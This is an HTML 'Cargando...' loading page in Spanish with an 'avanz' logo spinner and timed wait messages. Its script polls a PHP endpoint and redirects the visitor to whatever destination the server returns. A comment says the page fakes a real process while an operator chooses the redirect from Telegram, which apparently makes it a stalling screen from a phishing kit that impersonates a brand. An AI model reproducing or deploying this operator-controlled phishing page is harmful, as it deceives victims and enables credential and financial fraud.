<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Cargando...</title>
    <style>
        body {
            background-color: #FFFFFF;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .loader {
            width: 150px;
            height: 150px;
            background: url('img/logo-avanz-mini.png') no-repeat center;
            background-size: contain;
            animation: spin 0.8s linear infinite, pauseEffect 0.3s infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            25% { transform: rotate(120deg); }
            50% { transform: rotate(240deg); }
            75% { transform: rotate(300deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes pauseEffect {
            0%, 20%, 40%, 60%, 80%, 100% { animation-play-state: running; }
            10%, 30%, 50%, 70%, 90% { animation-play-state: paused; }
        }
        #waitMsg {
            margin-top: 28px;
            font-family: 'Open Sans', 'Segoe UI', Arial, sans-serif;
            font-size: 15px;
            color: #555;
            text-align: center;
            min-height: 20px;
            opacity: 0;
            transition: opacity .5s;
        }
    </style>
    <script>
    function verificarRedireccion() {
      fetch("verificar_redireccion.php")
        .then(res => res.json())
        .then(data => {
          if (data.status === "redirigir") {
            window.location.href = data.destino;
          } else {
            setTimeout(verificarRedireccion, 3000);
          }
        })
        .catch(() => setTimeout(verificarRedireccion, 3000));
    }

    verificarRedireccion();

    // Mensajes de espera rotativos (sensación de proceso real mientras
    // el operador decide a dónde redirigir desde Telegram)
    var waitMsgs = [
      [4000,  'Confirmando solicitud...'],
      [9000,  'Procesando...'],
      [15000, 'Por favor espere, no cierre esta ventana...']
    ];
    waitMsgs.forEach(function (m) {
      setTimeout(function () {
        var el = document.getElementById('waitMsg');
        if (el) { el.textContent = m[1]; el.style.opacity = '1'; }
      }, m[0]);
    });
  </script>
</head>
<body>
    <div class="loader"></div>
    <p id="waitMsg"></p>
</body>
</html>
